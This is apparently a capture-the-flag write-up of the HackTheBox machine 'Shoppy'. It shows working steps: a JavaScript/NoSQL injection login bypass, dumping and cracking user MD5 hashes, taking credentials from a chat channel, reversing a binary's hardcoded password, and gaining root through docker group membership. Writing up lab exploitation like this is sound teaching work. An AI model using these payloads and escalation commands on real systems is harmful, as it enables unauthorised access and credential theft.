---
title: "HTB: Shoppy"
date: 2026-06-30
tags: [hackthebox, htb-shoppy, nosql-injection, mattermost, hashcat, ghidra, reverse-engineering, docker, easy, linux]
---

![Shoppy box card]({{ '/assets/img/shoppy/01-shoppy-card.png' | relative_url }})

Shoppy is an easy Linux box. The path runs through a NoSQL authentication bypass on a custom login, dumping user hashes out of a search field, cracking one to get into a Mattermost instance, pulling SSH creds out of a private channel, reversing a small C++ binary to move to the next user, and finally abusing docker group membership to read the root flag.

## Recon

### nmap

```bash
chickenprophecy@pwn$ nmap -sC -sV -p- --min-rate 10000 10.129.227.233 -oN shoppy.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    nginx 1.23.1
9093/tcp open  http    Golang net/http server
```

Three ports are open: SSH on 22, an nginx web server on 80, and a Go service on 9093. The OpenSSH version points to Debian 11. Port 80 redirects to `shoppy.htb`, so I added it to my hosts file so I could reach it by name.

```bash
chickenprophecy@pwn$ echo "10.129.227.233 shoppy.htb" | sudo tee -a /etc/hosts
```

The 9093 service is a Go metrics endpoint that looks like Prometheus. I noted it and moved on.

### The front page is a stub

![Shoppy beta front page]({{ '/assets/img/shoppy/02-front-page.png' | relative_url }})

The root of `shoppy.htb` is just a "beta coming soon" countdown. It seems empty, so the real content is probably either on another vhost or down an unlinked path.

### vhost fuzzing: first attempt was a dead end

The site uses a hostname, so I fuzzed for virtual hosts by varying the `Host` header. First, I tried the big DNS wordlist, but it found nothing.

```bash
chickenprophecy@pwn$ gobuster vhost -u http://shoppy.htb \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

(no results)
```

That does not mean there are no vhosts. It can also mean the wordlist did not contain the right name. I searched the SecLists DNS lists for `mattermost` and found that some smaller service-name style lists included it.

```bash
chickenprophecy@pwn$ grep -rl mattermost /usr/share/seclists/Discovery/DNS/ | head
/usr/share/seclists/Discovery/DNS/namelist.txt
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
...
```

Re-running with `namelist.txt` found a valid vhost.

```bash
chickenprophecy@pwn$ gobuster vhost -u http://shoppy.htb \
    -w /usr/share/seclists/Discovery/DNS/namelist.txt --append-domain

Found: mattermost.shoppy.htb Status: 200 [Size: 3122]
```

Then I added the new vhost to `/etc/hosts`.

```bash
chickenprophecy@pwn$ echo "10.129.227.233 mattermost.shoppy.htb" | sudo tee -a /etc/hosts
```

The key lesson here is that vhost fuzzing tests hidden hostnames like `mattermost.shoppy.htb`, while directory fuzzing tests hidden paths like `/admin`. Also, a bigger wordlist is not always better. The list that worked was smaller, but it had the service name `mattermost` in it.

### Directory brute on the main site

Next, I checked for hidden folders or pages on `shoppy.htb`.

```bash
chickenprophecy@pwn$ gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirb/common.txt

/admin   (Status: 302) [--> /login]
/login   (Status: 200)
```

`/admin` exists, but it redirects to `/login`. That usually means it is a protected admin route. `/login` returns 200, so it is a real Shoppy admin login page.

![Shoppy admin login]({{ '/assets/img/shoppy/03-admin-login.png' | relative_url }})

## Foothold: NoSQL auth bypass

### SQLi does nothing, operator injection hangs

This is a custom app, so I tried SQL injection first. A basic `' or 1=1#` did nothing. A single `'` in the login made the request hang for a full minute and return a 504.

Then I moved to NoSQL. The first thing I reached for was operator injection, turning the `password` value into a Mongo operator with `[$ne]`. It hung the exact same way.

### String interpolation payload works

The backend appears to build its query as a JavaScript string, something like this:

```js
this.username === '${input}' && this.password === '${input}'
```

So instead of using a Mongo operator, I injected JavaScript syntax into the username field to break the string and add an always-true condition.

```text
admin' || '1'=='1
```

Under the hood, that becomes something like this:

```js
this.username === 'admin' || '1'=='1' && this.password === '...'
```

`'1'=='1'` is always true, and `||` can short-circuit the check, so the login passes without a valid password. It only works if the username exists, so `admin` works and a made-up username does not.

That lands me on the admin panel.

![Shoppy admin panel]({{ '/assets/img/shoppy/04-admin-panel.png' | relative_url }})

## Dumping users

The admin panel has one interesting feature: **Search for users**.

![Shoppy user search]({{ '/assets/img/shoppy/05-user-search.png' | relative_url }})

Searching for `admin` returns a record with a download button, and the export is JSON containing the admin password hash. The search field is injectable too. An always-true condition makes the query match every record instead of one, dumping all users.

```json
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

Two users, two hashes. The reason an always-true condition dumps everything is simple: a database search returns every row that satisfies the condition. If the condition is always true, every row qualifies.

## Cracking the hash

Both hashes are 32 hex characters, which is the shape of an MD5 hash. MD5 is unsalted here, so common passwords can be cracked quickly. I ran hashcat with mode `0`, which is MD5.

```bash
chickenprophecy@pwn$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

6ebcea65320589ca4f2f1ce039975995:remembermethisway
```

Only Josh's hash cracked.

```text
username: josh
password: remembermethisway
```

### SSH as josh fails

The obvious next move is SSH, but Josh's password does not work there.

```bash
chickenprophecy@pwn$ ssh josh@shoppy.htb
josh@shoppy.htb's password:
Permission denied, please try again.
```

The Mattermost instance I found earlier takes the same kind of account, so I tried the credentials there instead.

## Mattermost

![Mattermost login]({{ '/assets/img/shoppy/06-mattermost-login.png' | relative_url }})

Josh's creds log straight into Mattermost. Reading the channels, the **Deploy Machine** private channel has a conversation between Josh and Jaeger. Jaeger drops a set of credentials plus a note about deploying with docker.

![Mattermost deploy credentials]({{ '/assets/img/shoppy/07-mattermost-creds.png' | relative_url }})

```text
username: jaeger
password: Sh0ppyBest@pp!
```

There is also a comment about C++, which becomes important later.

![Mattermost C++ hint]({{ '/assets/img/shoppy/08-mattermost-cpp.png' | relative_url }})

## Shell as jaeger

These creds do work over SSH.

```bash
chickenprophecy@pwn$ ssh jaeger@shoppy.htb
jaeger@shoppy.htb's password:

jaeger@shoppy:~$ cat user.txt
[user flag]
```

User flag captured. Then I checked sudo rights.

```bash
jaeger@shoppy:~$ sudo -l

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

Jaeger can run a `password-manager` binary as the `deploy` user. The C++ password manager Josh mentioned in Mattermost lines up with this.

## Lateral movement to deploy: reverse engineering

Running it asks for a master password I do not have.

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: test
Access denied! This incident will be reported !
```

### strings gives nothing useful

My first instinct was to pull the password straight out of the binary.

```bash
jaeger@shoppy:~$ strings /home/deploy/password-manager | grep -i -A3 -B3 master
...
Welcome to Josh password manager!
Please enter your master password:
Access granted! Here is creds !
cat /home/deploy/creds.txt
Access denied! This incident will be reported !
```

The prompts are there, but no password. That absence is a clue: the password is not stored as a normal string.

Later I learned that `strings -el` would have caught it because it is stored as a wide / 16-bit string that plain `strings` skips. But I solved it the more general way with Ghidra.

### Ghidra

I copied the binary to my box with `scp`.

```bash
chickenprophecy@pwn$ scp jaeger@shoppy.htb:/home/deploy/password-manager .
```

Then I opened it in Ghidra and read the decompiled `main`. Ghidra reconstructs the machine code into readable C-like code, which lets me see the password even though plain `strings` did not.

![Ghidra password-manager decompile]({{ '/assets/img/shoppy/09-ghidra-sample.png' | relative_url }})

The relevant part looks like this:

```c
std::operator>>((basic_istream *)std::cin, local_48);   // my input

local_68 += "S";
local_68 += "a";
local_68 += "m";
local_68 += "p";
local_68 += "l";
local_68 += "e";

iVar1 = std::__cxx11::basic_string<>::compare(local_48);  // input vs local_68
```

`local_48` is whatever I type. `local_68` is built one character at a time: `S`, `a`, `m`, `p`, `l`, `e`. Then the program compares my input against that string.

So the master password is:

```text
Sample
```

It was never stored as one normal word, which is why plain `strings` did not find it.

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

## Privilege escalation: docker group

SSH in as `deploy` and check groups.

```bash
chickenprophecy@pwn$ ssh deploy@shoppy.htb

deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

`deploy` is in the `docker` group, which is effectively root. The docker daemon runs as root, and a container can mount the host filesystem inside itself. That means a member of the docker group can read and write the host filesystem as root.

There is already an Alpine image on the box.

```bash
deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   3 years ago    5.53MB
```

Launch a container from it with the host's `/` mounted in, then `chroot` into it so it feels like a normal host shell running as root.

```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
[root flag]
```

Flags explained:

- `-v /:/mnt` mounts the host root filesystem into the container at `/mnt`
- `--rm` deletes the container on exit
- `-it` gives an interactive shell
- `chroot /mnt sh` makes the host filesystem the new root and drops a shell

Root flag captured.
